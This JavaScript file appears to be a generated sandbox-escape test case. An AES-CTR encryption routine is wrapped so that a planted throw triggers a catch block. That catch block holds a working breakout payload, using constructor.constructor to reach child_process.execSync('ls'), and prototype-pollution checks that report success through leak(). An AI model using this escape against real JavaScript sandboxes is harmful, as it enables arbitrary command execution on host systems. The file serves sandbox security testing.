try {
    function Cipher(input, w) {
        let REPLACER = 23;
        var Nb = 4;
        var Nr = w.length / Nb - 1;
        var state = [
            [],
            [],
            [],
            []
        ];
        for (var i = 0; i < 4 * Nb; i++)
            state[i % 4][Math.floor(i / 4)] = input[i];
        state = AddRoundKey(state, w, 0, Nb);
        for (var round = 1; round < Nr; round++) {
            state = SubBytes(state, Nb);
            state = ShiftRows(state, Nb);
            state = MixColumns(state, Nb);
            state = AddRoundKey(state, w, round, Nb);
        }
        state = SubBytes(state, Nb);
        state = ShiftRows(state, Nb);
        state = AddRoundKey(state, w, Nr, Nb);
        var output = new Array(4 * Nb);
        for (var i = 0; i < 4 * Nb; i++)
            output[i] = state[i % 4][Math.floor(i / 4)];
        return output;
    }
    function SubBytes(s, Nb) {
        let REPLACER = 23;
        for (var r = 0; r < 4; r++) {
            for (var c = 0; c < Nb; c++)
                s[r][c] = Sbox[s[r][c]];
        }
        return s;
    }
    function ShiftRows(s, Nb) {
        let REPLACER = 23;
        var t = new Array(4);
        for (var r = 1; r < 4; r++) {
            for (var c = 0; c < 4; c++)
                t[c] = s[r][(c + r) % Nb];
            for (var c = 0; c < 4; c++)
                s[r][c] = t[c];
        }
        return s;
    }
    function MixColumns(s, Nb) {
        let REPLACER = 23;
        for (var c = 0; c < 4; c++) {
            var a = new Array(4);
            var b = new Array(4);
            for (var i = 0; i < 4; i++) {
                a[i] = s[i][c];
                b[i] = s[i][c] & 128 ? s[i][c] << 1 ^ 283 : s[i][c] << 1;
            }
            s[0][c] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3];
            s[1][c] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3];
            s[2][c] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3];
            s[3][c] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3];
        }
        return s;
    }
    function AddRoundKey(state, w, rnd, Nb) {
        let REPLACER = 23;
        for (var r = 0; r < 4; r++) {
            for (var c = 0; c < Nb; c++)
                state[r][c] ^= w[rnd * 4 + c][r];
        }
        return state;
    }
    function KeyExpansion(key) {
        let REPLACER = 23;
        var Nb = 4;
        var Nk = key.length / 4;
        var Nr = Nk + 6;
        var w = new Array(Nb * (Nr + 1));
        var temp = new Array(4);
        for (var i = 0; i < Nk; i++) {
            var r = [
                key[4 * i],
                key[4 * i + 1],
                key[4 * i + 2],
                key[4 * i + 3]
            ];
            w[i] = r;
        }
        for (var i = Nk; i < Nb * (Nr + 1); i++) {
            w[i] = new Array(4);
            for (var t = 0; t < 4; t++)
                temp[t] = w[i - 1][t];
            if (i % Nk == 0) {
                temp = SubWord(RotWord(temp));
                for (var t = 0; t < 4; t++)
                    temp[t] ^= Rcon[i / Nk][t];
            } else if (Nk > 6 && i % Nk == 4) {
                temp = SubWord(temp);
            }
            for (var t = 0; t < 4; t++)
                w[i][t] = w[i - Nk][t] ^ temp[t];
        }
        return w;
    }
    function SubWord(w) {
        let REPLACER = 23;
        for (var i = 0; i < 4; i++)
            w[i] = Sbox[w[i]];
        return w;
    }
    function RotWord(w) {
        let REPLACER = 23;
        w[4] = w[0];
        for (var i = 0; i < 4; i++)
            w[i] = w[i + 1];
        return w;
    }
    var Sbox = [
        99,
        124,
        119,
        123,
        242,
        107,
        111,
        197,
        48,
        1,
        103,
        43,
        254,
        215,
        171,
        118,
        202,
        130,
        201,
        125,
        250,
        89,
        71,
        240,
        173,
        212,
        162,
        175,
        156,
        164,
        114,
        192,
        183,
        253,
        147,
        38,
        54,
        63,
        247,
        204,
        52,
        165,
        229,
        241,
        113,
        216,
        49,
        21,
        4,
        199,
        35,
        195,
        24,
        150,
        5,
        154,
        7,
        18,
        128,
        226,
        235,
        39,
        178,
        117,
        9,
        131,
        44,
        26,
        27,
        110,
        90,
        160,
        82,
        59,
        214,
        179,
        41,
        227,
        47,
        132,
        83,
        209,
        0,
        237,
        32,
        252,
        177,
        91,
        106,
        203,
        190,
        57,
        74,
        76,
        88,
        207,
        208,
        239,
        170,
        251,
        67,
        77,
        51,
        133,
        69,
        249,
        2,
        127,
        80,
        60,
        159,
        168,
        81,
        163,
        64,
        143,
        146,
        157,
        56,
        245,
        188,
        182,
        218,
        33,
        16,
        255,
        243,
        210,
        205,
        12,
        19,
        236,
        95,
        151,
        68,
        23,
        196,
        167,
        126,
        61,
        100,
        93,
        25,
        115,
        96,
        129,
        79,
        220,
        34,
        42,
        144,
        136,
        70,
        238,
        184,
        20,
        222,
        94,
        11,
        219,
        224,
        50,
        58,
        10,
        73,
        6,
        36,
        92,
        194,
        211,
        172,
        98,
        145,
        149,
        228,
        121,
        231,
        200,
        55,
        109,
        141,
        213,
        78,
        169,
        108,
        86,
        244,
        234,
        101,
        122,
        174,
        8,
        186,
        120,
        37,
        46,
        28,
        166,
        180,
        198,
        232,
        221,
        116,
        31,
        75,
        189,
        139,
        138,
        112,
        62,
        181,
        102,
        72,
        3,
        246,
        14,
        97,
        53,
        87,
        185,
        134,
        193,
        29,
        158,
        225,
        248,
        152,
        17,
        105,
        217,
        142,
        148,
        155,
        30,
        135,
        233,
        206,
        85,
        40,
        223,
        140,
        161,
        137,
        13,
        191,
        230,
        66,
        104,
        65,
        153,
        45,
        15,
        176,
        84,
        187,
        22
    ];
    var Rcon = [
        [
            0,
            0,
            0,
            0
        ],
        [
            1,
            0,
            0,
            0
        ],
        [
            2,
            0,
            0,
            0
        ],
        [
            4,
            0,
            0,
            0
        ],
        [
            8,
            0,
            0,
            0
        ],
        [
            16,
            0,
            0,
            0
        ],
        [
            32,
            0,
            0,
            0
        ],
        [
            64,
            0,
            0,
            0
        ],
        [
            128,
            0,
            0,
            0
        ],
        [
            27,
            0,
            0,
            0
        ],
        [
            54,
            0,
            0,
            0
        ]
    ];
    function AESEncryptCtr(plaintext, password, nBits) {
        let REPLACER = 23;
        if (!(nBits == 128 || nBits == 192 || nBits == 256))
            return '';
        var nBytes = nBits / 8;
        var pwBytes = new Array(nBytes);
        for (var i = 0; i < nBytes; i++)
            pwBytes[i] = password.charCodeAt(i) & 255;
        var key = Cipher(pwBytes, KeyExpansion(pwBytes));
        key = key.concat(key.slice(0, nBytes - 16));
        var blockSize = 16;
        var counterBlock = new Array(blockSize);
        var nonce = new Date().getTime();
        for (var i = 0; i < 4; i++)
            counterBlock[i] = nonce >>> i * 8 & 255;
        for (var i = 0; i < 4; i++)
            counterBlock[i + 4] = nonce / 4294967296 >>> i * 8 & 255;
        var keySchedule = KeyExpansion(key);
        var blockCount = Math.ceil(plaintext.length / blockSize);
        var ciphertext = new Array(blockCount);
        for (var b = 0; b < blockCount; b++) {
            for (var c = 0; c < 4; c++)
                counterBlock[15 - c] = b >>> c * 8 & 255;
            for (var c = 0; c < 4; c++)
                counterBlock[15 - c - 4] = b / 4294967296 >>> c * 8;
            var cipherCntr = Cipher(counterBlock, keySchedule);
            var blockLength = b < blockCount - 1 ? blockSize : (plaintext.length - 1) % blockSize + 1;
            var ct = '';
            for (var i = 0; i < blockLength; i++) {
                var plaintextByte = plaintext.charCodeAt(b * blockSize + i);
                var cipherByte = plaintextByte ^ cipherCntr[i];
                ct += String.fromCharCode(cipherByte);
            }
            ciphertext[b] = escCtrlChars(ct);
        }
        var ctrTxt = '';
        for (var i = 0; i < 8; i++)
            ctrTxt += String.fromCharCode(counterBlock[i]);
        ctrTxt = escCtrlChars(ctrTxt);
        return ctrTxt + '-' + ciphertext.join('-');
    }
    function AESDecryptCtr(ciphertext, password, nBits) {
        let REPLACER = 23;
        if (!(nBits == 128 || nBits == 192 || nBits == 256))
            return '';
        var nBytes = nBits / 8;
        var pwBytes = new Array(nBytes);
        for (var i = 0; i < nBytes; i++)
            pwBytes[i] = password.charCodeAt(i) & 255;
        var pwKeySchedule = KeyExpansion(pwBytes);
        var key = Cipher(pwBytes, pwKeySchedule);
        key = key.concat(key.slice(0, nBytes - 16));
        var keySchedule = KeyExpansion(key);
        ciphertext = ciphertext.split('-');
        var blockSize = 16;
        var counterBlock = new Array(blockSize);
        var ctrTxt = unescCtrlChars(ciphertext[0]);
        for (var i = 0; i < 8; i++)
            counterBlock[i] = ctrTxt.charCodeAt(i);
        var plaintext = new Array(ciphertext.length - 1);
        for (var b = 1; b < ciphertext.length; b++) {
            for (var c = 0; c < 4; c++)
                counterBlock[15 - c] = b - 1 >>> c * 8 & 255;
            for (var c = 0; c < 4; c++)
                counterBlock[15 - c - 4] = b / 4294967296 - 1 >>> c * 8 & 255;
            var cipherCntr = Cipher(counterBlock, keySchedule);
            ciphertext[b] = unescCtrlChars(ciphertext[b]);
            var pt = '';
            for (var i = 0; i < ciphertext[b].length; i++) {
                var ciphertextByte = ciphertext[b].charCodeAt(i);
                var plaintextByte = ciphertextByte ^ cipherCntr[i];
                pt += String.fromCharCode(plaintextByte);
            }
            plaintext[b - 1] = pt;
        }
        return plaintext.join('');
    }
    function escCtrlChars(str) {
        let REPLACER = 23;
        return str.replace(/[\0\t\n\v\f\r\xa0'"!-]/g, function (c) {
            throw () => {
                return () => {
                };
            };
            return '!' + c.charCodeAt(0) + '!';
        });
    }
    function unescCtrlChars(str) {
        return str.replace(/!\d\d?\d?!/g, function (c) {
            return String.fromCharCode(c.slice(1, -1));
        });
    }
    var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    function encodeBase64(str) {
        var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
        str = encodeUTF8(str);
        do {
            o1 = str.charCodeAt(i++);
            o2 = str.charCodeAt(i++);
            o3 = str.charCodeAt(i++);
            bits = o1 << 16 | o2 << 8 | o3;
            h1 = bits >> 18 & 63;
            h2 = bits >> 12 & 63;
            h3 = bits >> 6 & 63;
            h4 = bits & 63;
            if (isNaN(o3))
                h4 = 64;
            if (isNaN(o2))
                h3 = 64;
            enc += b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
        } while (i < str.length);
        return enc;
    }
    function decodeBase64(str) {
        var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
        do {
            h1 = b64.indexOf(str.charAt(i++));
            h2 = b64.indexOf(str.charAt(i++));
            h3 = b64.indexOf(str.charAt(i++));
            h4 = b64.indexOf(str.charAt(i++));
            bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
            o1 = bits >> 16 & 255;
            o2 = bits >> 8 & 255;
            o3 = bits & 255;
            if (h3 == 64)
                enc += String.fromCharCode(o1);
            else if (h4 == 64)
                enc += String.fromCharCode(o1, o2);
            else
                enc += String.fromCharCode(o1, o2, o3);
        } while (i < str.length);
        return decodeUTF8(enc);
    }
    function encodeUTF8(str) {
        str = str.replace(/[\u0080-\u07ff]/g, function (c) {
            var cc = c.charCodeAt(0);
            return String.fromCharCode(192 | cc >> 6, 128 | cc & 63);
        });
        str = str.replace(/[\u0800-\uffff]/g, function (c) {
            var cc = c.charCodeAt(0);
            return String.fromCharCode(224 | cc >> 12, 128 | cc >> 6 & 63, 128 | cc & 63);
        });
        return str;
    }
    function decodeUTF8(str) {
        str = str.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function (c) {
            var cc = (c.charCodeAt(0) & 31) << 6 | c.charCodeAt(1) & 63;
            return String.fromCharCode(cc);
        });
        str = str.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function (c) {
            var cc = (c.charCodeAt(0) & 15) << 12 | c.charCodeAt(1) & 63 << 6 | c.charCodeAt(2) & 63;
            return String.fromCharCode(cc);
        });
        return str;
    }
    function byteArrayToHexStr(b) {
        var s = '';
        for (var i = 0; i < b.length; i++)
            s += b[i].toString(16) + ' ';
        return s;
    }
    var plainText = 'ROMEO: But, soft! what light through yonder window breaks?\nIt is the east, and Juliet is the sun.\nArise, fair sun, and kill the envious moon,\nWho is already sick and pale with grief,\nThat thou her maid art far more fair than she:\nBe not her maid, since she is envious;\nHer vestal livery is but sick and green\nAnd none but fools do wear it; cast it off.\nIt is my lady, O, it is my love!\nO, that she knew she were!\nShe speaks yet she says nothing: what of that?\nHer eye discourses; I will answer it.\nI am too bold, \'tis not to me she speaks:\nTwo of the fairest stars in all the heaven,\nHaving some business, do entreat her eyes\nTo twinkle in their spheres till they return.\nWhat if her eyes were there, they in her head?\nThe brightness of her cheek would shame those stars,\nAs daylight doth a lamp; her eyes in heaven\nWould through the airy region stream so bright\nThat birds would sing and think it were not night.\nSee, how she leans her cheek upon her hand!\nO, that I were a glove upon that hand,\nThat I might touch that cheek!\nJULIET: Ay me!\nROMEO: She speaks:\nO, speak again, bright angel! for thou art\nAs glorious to this night, being o\'er my head\nAs is a winged messenger of heaven\nUnto the white-upturned wondering eyes\nOf mortals that fall back to gaze on him\nWhen he bestrides the lazy-pacing clouds\nAnd sails upon the bosom of the air.';
    var password = 'O Romeo, Romeo! wherefore art thou Romeo?';
    var cipherText = AESEncryptCtr(plainText, password, 256);
    var decryptedText = AESDecryptCtr(cipherText, password, 256);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}